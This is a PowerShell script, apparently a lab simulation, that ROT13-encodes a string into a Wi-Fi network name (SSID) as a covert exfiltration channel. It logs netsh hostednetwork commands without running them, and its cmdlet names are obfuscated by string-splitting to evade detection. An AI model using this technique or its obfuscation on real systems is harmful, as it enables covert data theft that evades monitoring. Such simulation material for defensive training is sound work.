function Invoke-SSIDExfil {
    [CmdletBinding()]
    param(
        [switch]$ExfilOnly,
        [switch]$Decode,
        [string]$StringToExfiltrate,
        [string]$StringToDecode
    )
    function ConvertTo-ROT13 {
        param([string]$InputString)
        $builder = &("{1}{2}{0}"-f't','New-O','BJEC') System.Text.StringBuilder
        foreach ($char in $InputString.ToCharArray()) {
            $code = [int][char]$char
            switch ($code) {
                { $_ -ge 65 -and $_ -le 90 } {
                    [void]$builder.Append([char]((($_ - 65 + 13) % 26) + 65))
                    continue
                }
                { $_ -ge 97 -and $_ -le 122 } {
                    [void]$builder.Append([char]((($_ - 97 + 13) % 26) + 97))
                    continue
                }
                default {
                    [void]$builder.Append($char)
                }
            }
        }
        return $builder.ToString()
    }
    $artifactDir = &("{2}{0}{1}" -f'IN-pat','H','Jo') $PSScriptRoot "artifacts\ssid-exfil"
    if (-not (&("{0}{2}{1}"-f'tEs','-PATh','t') $artifactDir)) {
        $null = .("{2}{0}{1}"-f '-i','tem','NEW') -ItemType Directory -Path $artifactDir -Force
    }
    if ($Decode) {
        $decoded = .("{2}{0}{1}{3}"-f 'RttO','-RO','coNvE','t13') -InputString $StringToDecode
        .("{1}{0}{3}{2}"-f'e-OU','WrIT','UT','tP') "[safe] Decoded value: $decoded"
        return
    }
    if ($ExfilOnly) {
        $plainText = $StringToExfiltrate
    }
    else {
        $plainText = "LAB:alice:hello"
    }
    if ([string]::IsNullOrWhiteSpace($plainText)) {
        throw "StringToExfiltrate cannot be empty."
    }
    if ($plainText.Length -gt 32) {
        throw "The simulated SSID payload must be 32 characters or fewer."
    }
    $ssidName = &("{2}{1}{3}{0}{4}"-f 'ot','ERT','cOnV','To-R','13') -InputString $plainText
    $logPath = &("{0}{1}" -f 'JOin-P','atH') $artifactDir "ssid-actions.txt"
    $commands = @(
        "[safe] Would run: netsh wlan set hostednetwork mode=allow ssid=`"$ssidName`" key='HardtoGuess!@#123'",
        "[safe] Would run: netsh wlan start hostednetwork",
        "[safe] Plaintext source: $plainText",
        "[safe] ROT13 SSID: $ssidName"
    )
    &("{0}{2}{3}{1}" -f 's','NtEnt','E','T-cO') -Path $logPath -Value $commands -Encoding UTF8
    &("{1}{2}{0}" -f'TPUt','WR','iTe-Ou') "[safe] Simulated SSID exfiltration value: $ssidName"
    &("{1}{2}{3}{0}" -f'UTPUt','WR','iT','e-o') "[safe] Actions logged to $logPath"
}
&("{3}{1}{2}{0}{4}" -f'ExFI','NVokE-','SsiD','I','l') -ExfilOnly -StringToExfiltrate "LAB:alice:hello"
